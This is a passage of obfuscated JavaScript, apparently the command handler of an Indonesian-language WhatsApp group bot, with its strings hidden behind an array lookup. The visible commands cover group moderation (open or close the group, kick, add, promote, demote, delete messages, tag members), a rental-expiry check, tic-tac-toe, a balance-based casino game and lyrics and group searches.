                    _0x1c7aed(_0x5804c8(0x83d), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0xffcce2) return _0x358f3b(_0x5804c8(0x7ea));
                    let _0x44ff14 = antiwame2[_0x5804c8(0x7a8)](_0x1b1e88[_0x5804c8(0x60f)]);
                    antiwame2[_0x5804c8(0x217)](_0x44ff14, 0x1), fs['writeFileSync'](_0x5804c8(0xafe), JSON[_0x5804c8(0x736)](antiwame2, null, 0x2)), _0x358f3b(_0x5804c8(0xad1));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case _0x5804c8(0x140): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b(_0x5804c8(0xa4f));
            if (!_0x2ab1a1) return _0x358f3b(mess['BotAdmin']);
            if (_0x83eae5[0x1] == _0x5804c8(0x7cb)) var _0x91476f = _0x83eae5[0x0] * '1000';
            else {
                if (_0x83eae5[0x1] == _0x5804c8(0xaeb)) var _0x91476f = _0x83eae5[0x0] * '60000';
                else {
                    if (_0x83eae5[0x1] == 'jam') var _0x91476f = _0x83eae5[0x0] * '3600000';
                    else {
                        if (_0x83eae5[0x1] == _0x5804c8(0x921)) var _0x91476f = _0x83eae5[0x0] * _0x5804c8(0x3af);
                        else return _0x358f3b(_0x5804c8(0x402));
                    }
                }
            }
            _0x358f3b(_0x5804c8(0x2c5) + q + ' Dimulai Dari Sekarang'), setTimeout(() => {
                const _0x2e5837 = _0x5804c8;
                var _0x121095 = _0x1b1e88[_0x2e5837(0xc5a)];
                const _0x11c30d = _0x2e5837(0xd66);
                _0x614da8[_0x2e5837(0x40f)](_0x1b1e88[_0x2e5837(0x60f)], _0x2e5837(0x7b4)), _0x358f3b(_0x11c30d);
            }, _0x91476f);
        }
        break;
        case _0x5804c8(0x3cd):
        case _0x5804c8(0x287): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            _0x1c7aed(_0x5804c8(0x6eb), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x614da8['groupSettingUpdate'](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0x7b4));
            const _0x203dfb = await getTextSetOpen(_0x1b1e88['chat'], set_open);
            _0x358f3b(_0x203dfb || _0x5804c8(0x3de));
            break;
        }
        case _0x5804c8(0x444): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x63a));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x29f) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x497));
            if (isSetOpen(_0x1b1e88[_0x5804c8(0x60f)], set_open)) return _0x358f3b('Set open sudah ada sebelumnya');
            addSetOpen(_0x1b04cf, _0x1b1e88[_0x5804c8(0x60f)], set_open), _0x1c7aed(_0x5804c8(0x939), _0x1b1e88['sender'], _cmd), _0x358f3b(_0x5804c8(0x8c1));
        }
        break;
        case 'changeopen':
        case _0x5804c8(0x963):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x63a));
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x29f) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x497));
            isSetOpen(_0x1b1e88[_0x5804c8(0x60f)], set_open) ? (_0x1c7aed('#changeopen', _0x1b1e88[_0x5804c8(0xd13)], _cmd), changeSetOpen(_0x1b04cf, _0x1b1e88['chat'], set_open), _0x358f3b(_0x5804c8(0x31b))) : (_0x1c7aed(_0x5804c8(0x864), _0x1b1e88[_0x5804c8(0xd13)], _cmd), addSetOpen(_0x1b04cf, _0x1b1e88['chat'], set_open), _0x358f3b(_0x5804c8(0x31b)));
            break;
        case _0x5804c8(0x72c):
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x63a));
            if (!isSetOpen(_0x1b1e88[_0x5804c8(0x60f)], set_open)) return _0x358f3b('Belum ada set open di sini..');
            removeSetOpen(_0x1b1e88['chat'], set_open), _0x1c7aed('#delsetopen', _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x358f3b(_0x5804c8(0x88e));
            break;
        case _0x5804c8(0x9b2): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b(_0x5804c8(0xa4f));
            if (!_0x2ab1a1) return _0x358f3b(mess['BotAdmin']);
            if (_0x83eae5[0x1] == 'detik') var _0x91476f = _0x83eae5[0x0] * _0x5804c8(0x771);
            else {
                if (_0x83eae5[0x1] == _0x5804c8(0xaeb)) var _0x91476f = _0x83eae5[0x0] * _0x5804c8(0x7d4);
                else {
                    if (_0x83eae5[0x1] == _0x5804c8(0x687)) var _0x91476f = _0x83eae5[0x0] * '3600000';
                    else {
                        if (_0x83eae5[0x1] == 'harj') var _0x91476f = _0x83eae5[0x0] * _0x5804c8(0x3af);
                        else return _0x358f3b(_0x5804c8(0x402));
                    }
                }
            }
            _0x358f3b(_0x5804c8(0xcf0) + q + _0x5804c8(0x35e)), setTimeout(() => {
                const _0x4ded0a = _0x5804c8;
                var _0x27c541 = _0x1b1e88[_0x4ded0a(0xc5a)];
                const _0x4d0558 = 'Grup Di Tutup Oleh Admin\x0aSekarang Hanya Admin Yang Dapat Mengirim Pesan';
                _0x614da8[_0x4ded0a(0x40f)](_0x1b1e88[_0x4ded0a(0x60f)], _0x4ded0a(0x17f)), _0x358f3b(_0x4d0558);
            }, _0x91476f);
        }
        break;
        case _0x5804c8(0x749):
        case _0x5804c8(0x9ac):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            _0x1c7aed(_0x5804c8(0x17a), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x614da8[_0x5804c8(0x40f)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0x17f));
            const _0x15a789 = await getTextSetClose(_0x1b1e88['chat'], set_close);
            _0x358f3b(_0x15a789 || 'Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini');
            break;
        case 'setclose': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x63a));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x932) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc21));
            if (isSetClose(_0x1b1e88['chat'], set_close)) return _0x358f3b('Set close sudah ada sebelumnya');
            addSetClose(_0x1b04cf, _0x1b1e88[_0x5804c8(0x60f)], set_close), _0x1c7aed(_0x5804c8(0xcfa), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x358f3b(_0x5804c8(0xc1d));
        }
        break;
        case _0x5804c8(0xcf5):
        case _0x5804c8(0xa70):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x7b6ab6) return _0x358f3b('Fitur Khusus owner!');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *teks close*\x0a\x0a_Contoh_\x0a\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc21));
            isSetClose(_0x1b1e88[_0x5804c8(0x60f)], set_close) ? (_0x1c7aed(_0x5804c8(0x18e), _0x1b1e88['sender'], _cmd), changeSetClose(_0x1b04cf, _0x1b1e88['chat'], set_close), _0x358f3b('Sukses ubah set close teks!')) : (_0x1c7aed(_0x5804c8(0x18e), _0x1b1e88['sender'], _cmd), addSetClose(_0x1b04cf, _0x1b1e88[_0x5804c8(0x60f)], set_close), _0x358f3b(_0x5804c8(0x8ed)));
            break;
        case 'delsetclose':
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x63a));
            if (!isSetClose(_0x1b1e88['chat'], set_close)) return _0x358f3b('Belum ada set close di sini..');
            removeSetClose(_0x1b1e88[_0x5804c8(0x60f)], set_close), _0x1c7aed(_0x5804c8(0x6d3), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x358f3b(_0x5804c8(0x839));
            break;
        case _0x5804c8(0x648): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6 && !_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            let _0x37712f = _0x1b1e88['mentionedJid'][0x0] ? _0x1b1e88[_0x5804c8(0x583)][0x0] : _0x1b1e88[_0x5804c8(0x6a4)] ? _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)] : _0x1b04cf['replace'](/[^0-9]/g, '') + _0x5804c8(0x7cd);
            await _0x614da8[_0x5804c8(0x1b2)](_0x1b1e88[_0x5804c8(0x60f)], [_0x37712f], _0x5804c8(0x61d))[_0x5804c8(0xabe)](_0x47f6be => _0x358f3b(_0x5804c8(0x346)))[_0x5804c8(0xb9d)](_0x26a595 => _0x358f3b(_0x5804c8(0x74f)));
        }
        break;
        case _0x5804c8(0x23e): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6 && !_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            let _0x32a9d1 = _0x1b1e88[_0x5804c8(0x6a4)] ? _0x1b1e88[_0x5804c8(0x6a4)]['sender'] : _0x1b04cf['replace'](/[^0-9]/g, '') + '@s.whatsapp.net';
            await _0x614da8[_0x5804c8(0x1b2)](_0x1b1e88[_0x5804c8(0x60f)], [_0x32a9d1], _0x5804c8(0x23e))['then'](_0xee4fa5 => _0x358f3b('Sukses add member✅'))['catch'](_0x1ab8e6 => _0x358f3b(_0x5804c8(0x5e4)));
        }
        break;
        case _0x5804c8(0xca6):
        case 'pm': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6 && !_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            let _0x2aa433 = _0x1b1e88[_0x5804c8(0x583)][0x0] ? _0x1b1e88[_0x5804c8(0x583)][0x0] : _0x1b1e88['quoted'] ? _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)] : _0x1b04cf['replace'](/[^0-9]/g, '') + _0x5804c8(0x7cd);
            await _0x614da8[_0x5804c8(0x1b2)](_0x1b1e88[_0x5804c8(0x60f)], [_0x2aa433], _0x5804c8(0xca6))[_0x5804c8(0xabe)](_0x7d6dc2 => _0x358f3b(_0x5804c8(0x984)))['catch'](_0x3884f5 => _0x358f3b(_0x5804c8(0x49d)));
        }
        break;
        case _0x5804c8(0x6ac):
        case 'dm': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6 && !_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            let _0x45716b = _0x1b1e88[_0x5804c8(0x583)][0x0] ? _0x1b1e88[_0x5804c8(0x583)][0x0] : _0x1b1e88[_0x5804c8(0x6a4)] ? _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)] : _0x1b04cf[_0x5804c8(0xa72)](/[^0-9]/g, '') + _0x5804c8(0x7cd);
            await _0x614da8[_0x5804c8(0x1b2)](_0x1b1e88[_0x5804c8(0x60f)], [_0x45716b], 'demote')[_0x5804c8(0xabe)](_0x2a8429 => _0x358f3b(_0x5804c8(0x136)))[_0x5804c8(0xb9d)](_0x4436d4 => _0x358f3b(_0x5804c8(0x49d)));
        }
        break;
        case _0x5804c8(0x695):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            _0x1c7aed(_0x5804c8(0x42d), _0x1b1e88[_0x5804c8(0xd13)], _cmd), await _0x614da8[_0x5804c8(0x715)](_0x1b1e88['chat'])[_0x5804c8(0xabe)](_0x49d35d => {
                const _0xbfdf9b = _0x5804c8;
                _0x358f3b(_0xbfdf9b(0x87d));
            })[_0x5804c8(0xb9d)](() => _0x358f3b(mess[_0x5804c8(0x5d2)][_0x5804c8(0x344)]));
            break;
        case _0x5804c8(0xcb4): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b(_0x5804c8(0xd36));
            if (!_0x2ab1a1) return _0x358f3b(_0x5804c8(0xa7b));
            let _0x55af00 = _0x5804c8(0x190) + (q ? q : _0x5804c8(0x7c3)) + _0x5804c8(0xc87);
            for (let _0x548800 of _0x29f094) {
                _0x55af00 += _0x5804c8(0x3b5) + _0x548800['id'][_0x5804c8(0x4bd)]('@')[0x0] + '\x0a';
            }
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x55af00,
                'mentions': _0x29f094[_0x5804c8(0x686)](_0x45526f => _0x45526f['id'])
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x4a6):
        case 'h': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b(_0x5804c8(0xc50));
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': q ? q : '',
                'mentions': _0x29f094[_0x5804c8(0x686)](_0x1e69cb => _0x1e69cb['id'])
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case 'delete':
        case 'd':
        case 'del': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0x6a4)]) throw ![];
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            let _0x2cd819 = _0x1b1e88[_0x5804c8(0x583)][0x0] ? _0x1b1e88['mentionedJid'][0x0] : _0x1b1e88[_0x5804c8(0x6a4)] ? _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)] : _0x1b04cf[_0x5804c8(0xa72)](/[^0-9]/g, '') + '@s.whatsapp.net';
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'delete': {
                    'remoteJid': _0x1b1e88[_0x5804c8(0x60f)],
                    'id': _0x1b1e88['quoted']['id'],
                    'participant': _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)]
                }
            });
        }
        break;
        case 'checksewa':
        case _0x5804c8(0xa64): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x585e2d) return _0x358f3b('Bot tidak di sewa group ini!');
            _0x1c7aed('#checksewa', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0xc53b58 = ms(_sewa['getSewaExpired'](_0x1b1e88['chat'], sewa) - Date[_0x5804c8(0x7e5)]()),
                _0x3a8526 = _0x5804c8(0x2fe) + _0xc53b58[_0x5804c8(0x62f)] + ' day(s) ' + _0xc53b58[_0x5804c8(0x283)] + _0x5804c8(0x458) + _0xc53b58[_0x5804c8(0xb15)] + _0x5804c8(0xd7a);
            _0x358f3b(_0x3a8526);
        }
        break;
        case 'ttc':
        case 'ttt':
        case 'tictactoe': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            let _0xa95210 = require(_0x5804c8(0x33a));
            this[_0x5804c8(0x168)] = this[_0x5804c8(0x168)] ? this[_0x5804c8(0x168)] : {};
            if (Object['values'](this[_0x5804c8(0x168)])[_0x5804c8(0x958)](_0x5e460b => _0x5e460b['id']['startsWith']('tictactoe') && [_0x5e460b[_0x5804c8(0x168)][_0x5804c8(0x5c7)], _0x5e460b['game'][_0x5804c8(0x4cf)]]['includes'](_0x1b1e88[_0x5804c8(0xd13)]))) return _0x358f3b('Kamu masih didalam game');
            let _0x5a164c = Object[_0x5804c8(0x960)](this[_0x5804c8(0x168)])[_0x5804c8(0x958)](_0x2d2077 => _0x2d2077['state'] === _0x5804c8(0x1b3) && (_0x1b04cf ? _0x2d2077[_0x5804c8(0x35b)] === _0x1b04cf : !![]));
            if (_0x5a164c) {
                _0x358f3b(_0x5804c8(0x775)), _0x5a164c['o'] = _0x1b1e88[_0x5804c8(0x60f)], _0x5a164c[_0x5804c8(0x168)]['playerO'] = _0x1b1e88[_0x5804c8(0xd13)], _0x5a164c[_0x5804c8(0xcdc)] = _0x5804c8(0x2d0);
                let _0x5031ef = _0x5a164c[_0x5804c8(0x168)][_0x5804c8(0x3dc)]()[_0x5804c8(0x686)](_0x26b679 => {
                        const _0x289c19 = _0x5804c8;
                        return {
                            'X': '❌',
                            'O': '⭕',
                            0x1: _0x289c19(0x5f3),
                            0x2: _0x289c19(0xb87),
                            0x3: '3️⃣',
                            0x4: _0x289c19(0x999),
                            0x5: _0x289c19(0x2e1),
                            0x6: _0x289c19(0x1ae),
                            0x7: _0x289c19(0xb69),
                            0x8: _0x289c19(0x516),
                            0x9: '9️⃣'
                        } [_0x26b679];
                    }),
                    _0x336440 = _0x5804c8(0xae1) + _0x5a164c['id'] + '\x0a\x0a' + _0x5031ef['slice'](0x0, 0x3)[_0x5804c8(0xc6c)]('') + '\x0a' + _0x5031ef[_0x5804c8(0x7af)](0x3, 0x6)[_0x5804c8(0xc6c)]('') + '\x0a' + _0x5031ef[_0x5804c8(0x7af)](0x6)[_0x5804c8(0xc6c)]('') + '\x0a\x0aMenunggu @' + _0x5a164c['game'][_0x5804c8(0xc1b)][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x27a);
                if (_0x5a164c['x'] !== _0x5a164c['o']) await _0x614da8[_0x5804c8(0x4aa)](_0x5a164c['x'], _0x336440, _0x1b1e88, {
                    'mentions': parseMention(_0x336440)
                });
                await _0x614da8['sendText'](_0x5a164c['o'], _0x336440, _0x1b1e88, {
                    'mentions': parseMention(_0x336440)
                });
            } else {
                _0x5a164c = {
                    'id': _0x5804c8(0xc0d) + +new Date(),
                    'x': _0x1b1e88[_0x5804c8(0x60f)],
                    'o': '',
                    'game': new _0xa95210(_0x1b1e88[_0x5804c8(0xd13)], 'o'),
                    'state': 'WAITING'
                };
                if (_0x1b04cf) _0x5a164c[_0x5804c8(0x35b)] = _0x1b04cf;
                _0x358f3b(_0x5804c8(0x7d2) + (_0x1b04cf ? _0x5804c8(0xa39) + _0x3b7c58 + (_0x3b7c58 + _0x453fc1) + ' ' + _0x1b04cf : '')), this['game'][_0x5a164c['id']] = _0x5a164c;
            }
        }
        break;
        case _0x5804c8(0x1c1):
        case _0x5804c8(0x245): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            let _0x381b3e = Object['values'](this[_0x5804c8(0x168)])['find'](_0x5c5021 => _0x5c5021['id'][_0x5804c8(0xac2)]('tictactoe') && [_0x5c5021['game']['playerX'], _0x5c5021['game']['playerO']][_0x5804c8(0x34b)](_0x1b1e88['sender']));
            if (!_0x381b3e) return _0x358f3b('Kamu sedang tidak berada di room tictactoe !');
            delete this[_0x5804c8(0x168)][_0x381b3e['id']], _0x358f3b('Berhasil delete session room tictactoe !');
        }
        break;
        case 'casino': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0x6cd));
            if (isGame(_0x1b1e88[_0x5804c8(0xd13)], _0x7b6ab6, _0x1efa36, glimit)) return _0x358f3b(_0x5804c8(0x6b6));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x3f0) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x667));
            let _0x42b546 = _0x1b1e88['mentionedJid'][0x0] ? _0x1b1e88[_0x5804c8(0x583)][0x0] : _0x1b1e88['quoted'] ? _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)] : _0x1b04cf['replace'](/[^0-9]/g, '') + _0x5804c8(0x7cd);
            if (fs[_0x5804c8(0xb82)](_0x5804c8(0xb7b) + _0x1b1e88[_0x5804c8(0x60f)] + '.json')) return _0x358f3b(_0x5804c8(0x5f5) + _0x3b7c58 + _0x5804c8(0x614));
            if (!_0x83eae5[0x1]) return _0x358f3b(_0x5804c8(0x42b));
            if (_0x83eae5[0x1]['includes']('-')) return _0x358f3b(_0x5804c8(0x910));
            if (isNaN(parseInt(_0x83eae5[0x1]))) return _0x358f3b(_0x5804c8(0x30f));
            var _0x2e288c = getBalance(_0x1b1e88['sender'], balance),
                _0x476125 = getBalance(_0x1b1e88[_0x5804c8(0x583)][0x0], balance);
            if (_0x2e288c < _0x83eae5[0x1] || _0x2e288c == 'undefined') return _0x358f3b(_0x5804c8(0x246) + _0x3b7c58 + _0x5804c8(0x27e));
            if (_0x476125 < _0x83eae5[0x1] || _0x476125 == _0x5804c8(0x4fb)) return _0x358f3b(_0x5804c8(0x9b6) + _0x3b7c58 + _0x5804c8(0x730));
            var _0x4286a2 = setCasino('' + _0x1b1e88[_0x5804c8(0x60f)]);
            _0x4286a2['Z'] = _0x1b1e88['sender']['replace'](_0x5804c8(0x7cd), ''), _0x4286a2['Y'] = _0x42b546, _0x4286a2[_0x5804c8(0x264)] = parseInt(_0x83eae5[0x1]), _0x1c7aed(_0x5804c8(0xb9e), _0x1b1e88[_0x5804c8(0xd13)], _cmd), fs[_0x5804c8(0x933)](_0x5804c8(0x2aa) + _0x1b1e88[_0x5804c8(0x60f)] + _0x5804c8(0x6e9), JSON[_0x5804c8(0x736)](_0x4286a2, null, 0x2)), gameAdd(_0x1b1e88[_0x5804c8(0xd13)], glimit);
            var _0x5e1627 = _0x5804c8(0x99d) + _0x1b1e88['sender'][_0x5804c8(0xa72)](_0x5804c8(0x7cd), '') + _0x5804c8(0x455) + _0x1b04cf + _0x5804c8(0x28d) + parseInt(_0x83eae5[0x1]) + _0x5804c8(0xacb);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x5e1627,
                'mentions': [_0x1b1e88[_0x5804c8(0xd13)], _0x42b546]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x60c):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (fs['existsSync'](_0x5804c8(0x2aa) + _0x1b1e88[_0x5804c8(0x60f)] + '.json')) {
                var _0x400aa1 = JSON[_0x5804c8(0x370)](fs[_0x5804c8(0x456)](_0x5804c8(0x2aa) + _0x1b1e88[_0x5804c8(0x60f)] + _0x5804c8(0x6e9)));
                if (_0x400aa1['Z'][_0x5804c8(0x34b)](_0x1b1e88['sender'])) _0x1c7aed('#delcasino', _0x1b1e88[_0x5804c8(0xd13)], _cmd), deleteCasino(_0x1b1e88[_0x5804c8(0x60f)]), _0x358f3b(_0x5804c8(0x3d4));
                else {
                    if (_0x400aa1['Y'][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)])) _0x1c7aed('#delcasino', _0x1b1e88['sender'], _cmd), deleteCasino(_0x1b1e88[_0x5804c8(0x60f)]), _0x358f3b('Berhasil Menghapus Sesi Casino');
                    else {
                        if (_0x155c75) _0x1c7aed('#delcasino', _0x1b1e88[_0x5804c8(0xd13)], _cmd), deleteCasino(_0x1b1e88['chat']), _0x358f3b(_0x5804c8(0x3d4));
                        else _0x7b6ab6 ? (_0x1c7aed('#delcasino', _0x1b1e88[_0x5804c8(0xd13)], _cmd), deleteCasino(_0x1b1e88[_0x5804c8(0x60f)]), _0x358f3b(_0x5804c8(0x3d4))) : _0x358f3b(_0x5804c8(0xb01));
                    }
                }
            } else _0x358f3b(_0x5804c8(0x270));
            break;
        case _0x5804c8(0x275):
        case _0x5804c8(0x689): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x42f) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x43e));
            _0x358f3b(mess['wait']), _0x1c7aed(_0x5804c8(0xbf4), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            try {
                let _0x36e1c6 = await fetchJson(_0x5804c8(0xa00) + _0x1b04cf);
                if (!_0x36e1c6[_0x5804c8(0x233)]) return _0x358f3b(_0x5804c8(0x73a));
                limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
                let _0x56b9e9 = await fetchJson(_0x36e1c6[_0x5804c8(0x233)][0x0]['songLyrics']),
                    {
                        artist: _0x3437ea,
                        songTitle: _0x44854c,
                        songLyrics: _0x4141fa
                    } = _0x56b9e9[_0x5804c8(0x233)];
                _0x358f3b(_0x5804c8(0x81a) + _0x3437ea + _0x5804c8(0x37c) + _0x44854c + _0x5804c8(0xc9e) + _0x4141fa);
            } catch (_0x2c0d2f) {
                _0x358f3b('Lirik Lagu Tidak Ditemukan');
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0x75f):
        case _0x5804c8(0xcf3):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xb5c) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x53d));
            _0x358f3b(mess[_0x5804c8(0x135)]), _0x1c7aed('#grupwa', _0x1b1e88[_0x5804c8(0xd13)], _cmd), hxz[_0x5804c8(0x797)](q)['then'](async _0x2531e6 => {
                const _0x3d5564 = _0x5804c8;
                if (_0x2531e6[_0x3d5564(0x977)] == 0x0) return _0x358f3b(_0x3d5564(0x9a2) + q + _0x3d5564(0x8ec));
                var _0xc95360 = '*Hasil Pencarian Dari ' + q + _0x3d5564(0xc87);
                for (let _0x4fdb27 of _0x2531e6) {
                    _0xc95360 += '*Nama :* ' + _0x4fdb27[_0x3d5564(0x452)] + _0x3d5564(0x574) + _0x4fdb27[_0x3d5564(0x734)] + '\x0a\x0a';
                }
                _0x358f3b(_0xc95360), limitAdd(_0x1b1e88[_0x3d5564(0xd13)], limit);
            })[_0x5804c8(0xb9d)](_0x2f641e => {
                const _0x347625 = _0x5804c8;
                console[_0x347625(0xcd3)](color(_0x347625(0xd58), _0x347625(0xb3d)), _0x2f641e), _0x358f3b(_0x347625(0x798) + q + _0x347625(0x8ec));
            });
            break;
        case _0x5804c8(0x1fa): {
